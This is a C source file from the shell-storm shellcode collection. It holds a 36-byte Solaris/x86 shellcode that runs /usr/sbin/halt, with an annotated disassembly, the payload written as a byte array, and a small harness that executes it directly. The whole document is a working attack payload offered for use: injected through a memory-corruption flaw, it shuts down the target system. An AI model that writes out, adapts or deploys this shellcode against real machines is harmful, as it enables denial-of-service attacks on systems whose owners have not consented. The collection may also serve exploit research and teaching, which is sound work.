/*
Title:   Solaris/x86 - Halt shellcode - 36 bytes
Auhtor:  Jonathan Salwan <submit AT shell-storm.org>
Web:     http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan

Date:	 2010-05-20
Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris

!Database of Shellcodes http://www.shell-storm.org/shellcode/


Description:
------------

 The halt and poweroff utilities write any  pending  information
 to the disks and then stop the processor. The poweroff utility
 will have the machine remove power, if possible.

 The halt and poweroff  utilities  normally  log  the  system
 shutdown  to the system log daemon, syslogd(1M), and place a
 shutdown record in the login accounting file /var/adm/wtmpx.
 These  actions  are  inhibited  if  the -n or -q options are
 present.



Disassembly informations:
-------------------------

section .text
    0x8048074:              31 d2              xorl   %edx,%edx
    0x8048076:              52                 pushl  %edx
    0x8048077:              66 68 6c 74        pushw  $0x746c
    0x804807b:              68 6e 2f 68 61     pushl  $0x61682f6e
    0x8048080:              68 2f 73 62 69     pushl  $0x6962732f
    0x8048085:              68 2f 75 73 72     pushl  $0x7273752f
    0x804808a:              89 e3              movl   %esp,%ebx
    0x804808c:              52                 pushl  %edx
    0x804808d:              53                 pushl  %ebx
    0x804808e:              89 e1              movl   %esp,%ecx
    0x8048090:              52                 pushl  %edx
    0x8048091:              51                 pushl  %ecx
    0x8048092:              53                 pushl  %ebx
    0x8048093:              b0 3b              movb   $0x3b,%al
    0x8048095:              52                 pushl  %edx
    0x8048096:              cd 91              int    $0x91

*/

#include <stdio.h>

char sc[] = "\x31\xd2\x52\x66\x68\x6c\x74\x68\x6e"
            "\x2f\x68\x61\x68\x2f\x73\x62\x69\x68"
            "\x2f\x75\x73\x72\x89\xe3\x52\x53\x89"
            "\xe1\x52\x51\x53\xb0\x3b\x52\xcd\x91";


int main(void)
{
       fprintf(stdout,"Lenght: %d\n",strlen(sc));
       (*(void(*)()) sc)();

return 0;
}